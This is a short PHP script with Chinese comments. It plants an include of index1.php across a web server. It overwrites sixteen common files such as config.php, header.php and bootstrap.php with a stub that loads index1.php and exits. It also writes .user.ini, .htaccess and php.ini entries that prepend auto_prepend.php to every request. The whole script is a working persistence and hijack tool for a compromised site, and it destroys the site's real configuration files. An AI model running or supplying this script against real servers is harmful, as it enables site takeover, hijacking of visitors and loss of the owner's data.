<?php
// 强力版本 - 创建更多可能的包含点
echo "执行强力配置...\n";

$include_code = '<?php
// 强力包含index1.php
if (file_exists("index1.php")) {
    @include "index1.php";
    exit;
}
if (file_exists("../index1.php")) {
    @include "../index1.php";
    exit;
}
?>';

// 创建大量可能的包含文件
$all_possible_files = [
    'auto_prepend.php', 'auto_append.php', 'prepend.php', 'append.php',
    'header.php', 'footer.php', 'config.php', 'settings.php',
    'init.php', 'bootstrap.php', 'startup.php', 'loader.php',
    'common.php', 'global.php', 'main.php', 'core.php'
];

$created_count = 0;
foreach ($all_possible_files as $file) {
    if (file_put_contents($file, $include_code)) {
        $created_count++;
        echo "✓ $file\n";
    }
}

// 创建多个配置文件
$config_files = [
    '.user.ini' => 'auto_prepend_file = auto_prepend.php',
    '.htaccess' => 'php_value auto_prepend_file "auto_prepend.php"',
    'php.ini' => 'auto_prepend_file = auto_prepend.php'
];

foreach ($config_files as $file => $content) {
    if (file_put_contents($file, $content)) {
        echo "✓ 配置: $file\n";
    }
}

echo "\n🎯 强力配置完成！创建了 $created_count 个包含文件\n";
echo "现在直接访问您的域名测试效果！\n";
?>